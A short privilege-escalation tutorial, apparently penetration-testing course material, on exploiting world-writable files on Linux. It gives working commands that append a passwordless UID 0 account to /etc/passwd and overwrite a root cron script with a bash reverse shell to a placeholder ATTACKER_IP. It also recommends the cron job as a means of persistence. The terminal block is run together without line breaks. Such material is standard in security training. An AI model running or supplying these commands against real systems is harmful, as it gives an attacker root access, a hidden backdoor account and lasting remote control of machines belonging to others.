Exploiting Weak File Permissions

Modifying Critical System Files for Privilege Escalation

Scenario: Writable Cron Script

You find a script, `/opt/backup.sh`, that is world-writable and executed by a root cron job. You can modify this script to:

  • Inject a Reverse Shell: Get a root shell back to your machine.
  • Add a Root User: Create a new user with UID 0.
  • Modify System Files: Overwrite other critical files.
Key Takeaway

Exploiting weak file permissions involves identifying a writable file that a privileged process interacts with, then injecting malicious code to gain root access.

Example: Modifying `/etc/passwd`

If `/etc/passwd` is world-writable, you could directly add a new root user:

echo 'newroot::0:0:newroot:/root:/bin/bash' >> /etc/passwd

Then, you could log in as 'newroot' without a password (or set one if `/etc/shadow` is also writable).

Terminal: Overwriting a Writable Script

# Step 1: Confirm script is world-writable (example)ls -l /opt/backup.sh-rwxrwxrwx 1 root root 1234 Jan 1 2023 /opt/backup.sh# Step 2: Overwrite with a reverse shell payload (example)echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /opt/backup.sh# Step 3: Wait for cron job to execute (e.g., at 2 AM)
Important Note: Persistence

Modifying a cron job script provides persistence. Your payload will execute every time the cron job runs, ensuring continued access.
